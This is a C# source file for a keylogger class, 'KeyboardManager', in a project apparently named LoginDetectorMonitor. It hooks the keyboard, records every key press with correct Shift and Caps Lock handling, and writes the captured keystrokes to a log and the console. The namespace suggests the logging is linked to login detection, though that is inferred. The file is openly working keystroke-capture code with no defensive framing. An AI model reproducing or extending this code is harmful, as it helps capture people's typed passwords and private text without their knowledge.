﻿using System;
using System.Text;
using LoginDetectorMonitor.Logging;

namespace LoginDetectorMonitor.Input
{
    public class KeyboardManager : IDisposable
    {
        private readonly KeyboardHook _keyboardHook;
        private readonly KeyboardUtils _keyboardUtils;
        private readonly StringBuilder _keyLog;
        private bool _isLoggingEnabled = false;
        private bool _isDisposed = false;

        // Track modifier key states
        private bool _leftShiftPressed = false;
        private bool _rightShiftPressed = false;
        private bool _capsLockOn = false;

        public KeyboardManager()
        {
            _keyboardHook = new KeyboardHook();
            _keyboardUtils = new KeyboardUtils();
            _keyLog = new StringBuilder();

            // Register for key press events
            _keyboardHook.KeyPressed += OnKeyPressed;
        }

        public bool Initialize()
        {
            // Initialize the keyboard hook
            bool result = _keyboardHook.Initialize();

            if (result)
            {
                // Get initial caps lock state
                _capsLockOn = _keyboardUtils.IsCapsLockOn();
                Logger.Log($"Keyboard initialized with CapsLock state: {(_capsLockOn ? "ON" : "OFF")}");
            }

            return result;
        }

        public void EnableKeylogger()
        {
            // Clear previous log when starting a new session
            _keyLog.Clear();
            _isLoggingEnabled = true;
            Logger.Log("Keylogger enabled");
        }

        public void DisableKeylogger()
        {
            _isLoggingEnabled = false;

            // Save current keylog since we're disabling temporarily
            if (_keyLog.Length > 0)
            {
                Logger.Log($"Captured keystrokes: {_keyLog}");
                _keyLog.Clear();
            }

            Logger.Log("Keylogger disabled");
        }

        public void StopKeylogger()
        {
            // Save any remaining captured keys
            if (_keyLog.Length > 0)
            {
                Logger.Log($"Final captured keystrokes: {_keyLog}");
                _keyLog.Clear();
            }

            _keyboardHook.Stop();
            Logger.Log("Keylogger stopped completely");
        }

        private void OnKeyPressed(object sender, KeyPressEventArgs eventArgs)
        {
            if (!_isLoggingEnabled) return;

            int vkCode = eventArgs.VirtualKeyCode;

            if (eventArgs.IsKeyDown)
            {
                // Handle modifier keys and special keys
                switch (vkCode)
                {
                    case 20: // VK_CAPITAL (Caps Lock)
                        _capsLockOn = !_capsLockOn;
                        Logger.Log($"CapsLock toggled: {(_capsLockOn ? "ON" : "OFF")}");
                        break;

                    case 160: // Left shift
                        _leftShiftPressed = true;
                        break;

                    case 161: // Right shift
                        _rightShiftPressed = true;
                        break;

                    case 16: // Generic shift
                        if (!_leftShiftPressed && !_rightShiftPressed)
                        {
                            _leftShiftPressed = true;
                        }
                        break;

                    default:
                        // Process regular keys
                        ProcessKeyPress(vkCode);
                        break;
                }
            }
            else // Key up
            {
                // Handle modifier key releases
                switch (vkCode)
                {
                    case 160: // Left shift
                        _leftShiftPressed = false;
                        break;

                    case 161: // Right shift
                        _rightShiftPressed = false;
                        break;

                    case 16: // Generic shift
                        _leftShiftPressed = _rightShiftPressed = false;
                        break;
                }
            }
        }

        private void ProcessKeyPress(int vkCode)
        {
            bool shiftActive = _leftShiftPressed || _rightShiftPressed;

            // Get the character representation of the key
            string keyChar = _keyboardUtils.GetKeyChar(vkCode, shiftActive, _capsLockOn);

            // Add to key log
            _keyLog.Append(keyChar);

            // Log the key press (for debugging/monitoring)
            Logger.Log($"Key: {keyChar}");

            // Optional: Output to console for immediate feedback
            Console.Write(keyChar);
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!_isDisposed)
            {
                if (disposing)
                {
                    StopKeylogger();
                    _keyboardHook.Dispose();
                }

                _isDisposed = true;
            }
        }

        ~KeyboardManager()
        {
            Dispose(false);
        }
    }
}